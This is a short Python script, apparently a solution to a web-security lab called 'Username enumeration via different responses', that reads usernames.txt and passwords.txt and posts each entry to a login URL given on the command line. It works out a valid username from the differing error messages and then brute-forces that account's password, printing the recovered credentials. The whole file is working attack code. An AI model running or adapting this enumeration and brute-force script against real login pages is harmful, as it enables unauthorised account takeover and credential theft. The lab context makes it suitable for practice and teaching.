import requests
import sys
import os
import getopt


def clear_screen():
  if os.name == 'posix':
    clear_window = os.system('clear')
  else:
    clear_window = os.system('cls')


def get_username(url, session):
  usernames = open('usernames.txt', 'r')

  for username in usernames:
    username = username.strip()
    data = {'username' : username, 'password' : 'a'}
    post_r = session.post(url, data = data)

    if "Invalid username" not in post_r.text:
      valid_username = username
      usernames.close()
      break

  return valid_username


def get_password(url, session, valid_username):
  passwords = open('passwords.txt', 'r')

  for password in passwords:
    password = password.strip()
    obj = {'username' : valid_username, 'password' : password}
    post_r = session.post(url, data = obj)

    if "Incorrect password" not in post_r.text:
      valid_password = password
      passwords.close()
      break

  return valid_password


def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print("This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login")
      print("\x1b[?25h")
      sys.exit()

  session = requests.Session()
  username = get_username(url, session)
  password = get_password(url, session, username)

  print(f"Username: {username}\nPassword: {password}")


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()